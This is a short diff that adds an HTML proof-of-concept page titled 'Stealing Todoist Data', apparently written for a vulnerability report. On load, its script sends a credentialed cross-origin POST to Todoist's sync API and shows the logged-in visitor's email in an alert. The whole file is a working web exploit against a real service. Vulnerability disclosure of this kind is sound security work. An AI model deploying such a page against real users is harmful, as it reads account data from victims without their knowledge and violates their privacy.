@@ -1,0 +1,22 @@
+<!-- index.html -->
+<html>
+  <body>
+    <h2>PoC: Stealing Todoist Data</h2>
+    <script>
+      fetch("https://app.todoist.com/api/v1/sync", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          resource_types: ["user"]
+        }),
+        credentials: "include"
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert("User email: " + data.user.email); // إثبات واضح
+      });
+    </script>
+  </body>
+</html>
